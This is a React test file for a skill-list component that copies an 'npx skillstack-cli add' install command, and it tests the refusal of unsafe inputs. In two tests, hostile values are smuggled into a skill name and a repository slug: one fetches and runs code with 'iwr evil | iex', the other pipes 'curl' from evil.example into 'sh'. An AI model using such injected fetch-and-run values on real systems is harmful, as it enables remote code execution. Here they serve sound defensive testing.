import { render, screen, within } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

import { buildInstallCommand } from '@shared';

import { SkillList } from './SkillList';

const REPO_SLUG = 'octocat/hello-world';

const skills = [
  { name: 'code-review', installCount: 3, description: 'Reviews code' },
  { name: 'git-commit', installCount: 1 },
  { name: 'eleks-ui', installCount: 0, description: 'Builds UI' }
];

function renderSkillList() {
  return render(<SkillList repoSlug={REPO_SLUG} skills={skills} />);
}

const getRow = (index: number) => screen.getAllByTestId('skill-item')[index];

const copyButtonOf = (index: number) =>
  within(getRow(index)).getByRole('button', { name: 'Copy install command' });

describe('SkillList', () => {
  beforeEach(() => {
    vi.useRealTimers();
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  it("should render each skill's name, description and install count", () => {
    renderSkillList();

    expect(screen.getByTestId('skill-list')).toBeInTheDocument();
    expect(screen.getAllByTestId('skill-item')).toHaveLength(3);
    expect(within(getRow(0)).getByText('code-review')).toBeInTheDocument();
    expect(within(getRow(0)).getByText('Reviews code')).toBeInTheDocument();
    expect(
      within(getRow(0)).getByTestId('skill-install-count')
    ).toHaveTextContent('3 installs');
  });

  it('should keep the order of the given skills', () => {
    renderSkillList();

    const names = screen
      .getAllByTestId('skill-item')
      .map(row => row.querySelector('.MuiListItemText-primary')?.textContent);

    expect(names).toEqual(['code-review', 'git-commit', 'eleks-ui']);
  });

  it('should render a skill without a description', () => {
    renderSkillList();

    const row = getRow(1);

    expect(within(row).getByText('git-commit')).toBeInTheDocument();
    expect(row.querySelector('.MuiListItemText-secondary')).toBeNull();
  });

  it('should show 0 installs for a skill with no installs', () => {
    renderSkillList();

    expect(
      within(getRow(2)).getByTestId('skill-install-count')
    ).toHaveTextContent('0 installs');
  });

  it('should use the singular for a skill with one install', () => {
    renderSkillList();

    expect(
      within(getRow(1)).getByTestId('skill-install-count')
    ).toHaveTextContent(/^1 install$/);
  });

  it('should render a copy button for every skill', () => {
    renderSkillList();

    expect(screen.getAllByTestId('skill-copy-button')).toHaveLength(3);
  });

  describe('copying the install command', () => {
    it("should copy the clicked skill's install command and confirm it", async () => {
      const user = userEvent.setup();
      const writeText = vi
        .spyOn(navigator.clipboard, 'writeText')
        .mockResolvedValue(undefined);
      renderSkillList();

      await user.click(copyButtonOf(1));

      expect(writeText).toHaveBeenCalledTimes(1);
      expect(writeText).toHaveBeenCalledWith(
        buildInstallCommand(REPO_SLUG, 'git-commit')
      );
      expect(writeText).toHaveBeenCalledWith(
        'npx skillstack-cli add https://github.com/octocat/hello-world --skill git-commit'
      );
      expect(await screen.findByTestId('copy-feedback')).toHaveTextContent(
        'Install command copied'
      );
    });

    it('should not display the install command text on the page', async () => {
      const user = userEvent.setup();
      vi.spyOn(navigator.clipboard, 'writeText').mockResolvedValue(undefined);
      renderSkillList();

      expect(document.body).not.toHaveTextContent('npx skillstack-cli');

      await user.click(copyButtonOf(0));
      await screen.findByTestId('copy-feedback');

      expect(document.body).not.toHaveTextContent('npx skillstack-cli');
    });

    it('should report the failure and show the full command when the clipboard write fails', async () => {
      const user = userEvent.setup();
      vi.spyOn(navigator.clipboard, 'writeText').mockRejectedValue(
        new DOMException('denied', 'NotAllowedError')
      );
      renderSkillList();

      await user.click(copyButtonOf(0));

      const feedback = await screen.findByTestId('copy-feedback');

      expect(feedback).toHaveTextContent(
        'Could not copy the install command. Run: npx skillstack-cli add https://github.com/octocat/hello-world --skill code-review'
      );
      expect(feedback).not.toHaveTextContent('Install command copied');
    });

    it('should report the failure when the clipboard API is unavailable', async () => {
      const user = userEvent.setup();
      Object.defineProperty(navigator, 'clipboard', {
        value: undefined,
        configurable: true
      });
      renderSkillList();

      await user.click(copyButtonOf(2));

      expect(await screen.findByTestId('copy-feedback')).toHaveTextContent(
        'Could not copy the install command. Run: npx skillstack-cli add https://github.com/octocat/hello-world --skill eleks-ui'
      );
    });

    describe('when the command cannot be built safely', () => {
      const REFUSAL = 'Could not build a safe install command for this skill.';

      async function clickCopyOfUnsafeSkill(
        repoSlug: string,
        skillName: string
      ) {
        const user = userEvent.setup();
        // NOTE: stub after setup(), which replaces navigator.clipboard
        const writeText = vi
          .spyOn(navigator.clipboard, 'writeText')
          .mockResolvedValue(undefined);

        render(
          <SkillList
            repoSlug={repoSlug}
            skills={[{ name: skillName, installCount: 1 }]}
          />
        );

        await user.click(copyButtonOf(0));

        const feedback = await screen.findByTestId('copy-feedback');

        expect(feedback).toHaveTextContent(REFUSAL);
        expect(feedback).not.toHaveTextContent('Install command copied');
        expect(writeText).not.toHaveBeenCalled();
        expect(document.body).not.toHaveTextContent('npx skillstack-cli');
        expect(document.body).not.toHaveTextContent('https://github.com/');

        return feedback;
      }

      it('should not copy anything and report the refusal without a command for an unsafe skill name', async () => {
        const feedback = await clickCopyOfUnsafeSkill(
          REPO_SLUG,
          "x'; iwr evil | iex; '"
        );

        expect(feedback).not.toHaveTextContent('iwr');
        expect(feedback).not.toHaveTextContent('iex');
      });

      it('should not copy anything and report the refusal without a command for an unsafe repository slug', async () => {
        const feedback = await clickCopyOfUnsafeSkill(
          'acme/tools;curl -s https://evil.example/x|sh;#',
          'lint'
        );

        expect(feedback).not.toHaveTextContent('evil.example');
        expect(feedback).not.toHaveTextContent('curl');
      });

      it('should keep the copy button enabled for a refused skill', () => {
        render(
          <SkillList
            repoSlug={REPO_SLUG}
            skills={[{ name: 'my skill; ls', installCount: 0 }]}
          />
        );

        expect(copyButtonOf(0)).toBeEnabled();
      });

      it('should still copy the other skills of the list', async () => {
        const user = userEvent.setup();
        const writeText = vi
          .spyOn(navigator.clipboard, 'writeText')
          .mockResolvedValue(undefined);
        render(
          <SkillList
            repoSlug={REPO_SLUG}
            skills={[
              { name: 'my skill; ls', installCount: 2 },
              { name: 'code-review', installCount: 1 }
            ]}
          />
        );

        await user.click(copyButtonOf(0));
        await screen.findByTestId('copy-feedback');
        await user.click(copyButtonOf(1));

        expect(writeText).toHaveBeenCalledTimes(1);
        expect(writeText).toHaveBeenCalledWith(
          'npx skillstack-cli add https://github.com/octocat/hello-world --skill code-review'
        );
        expect(await screen.findByTestId('copy-feedback')).toHaveTextContent(
          'Install command copied'
        );
      });
    });

    it('should show only the feedback of the latest copy', async () => {
      const user = userEvent.setup();
      const writeText = vi
        .spyOn(navigator.clipboard, 'writeText')
        .mockRejectedValueOnce(new Error('denied'))
        .mockResolvedValueOnce(undefined);
      renderSkillList();

      await user.click(copyButtonOf(0));
      await screen.findByTestId('copy-feedback');
      await user.click(copyButtonOf(1));

      expect(writeText).toHaveBeenCalledTimes(2);
      expect(await screen.findByTestId('copy-feedback')).toHaveTextContent(
        'Install command copied'
      );
      expect(screen.getAllByTestId('copy-feedback')).toHaveLength(1);
    });
  });
});
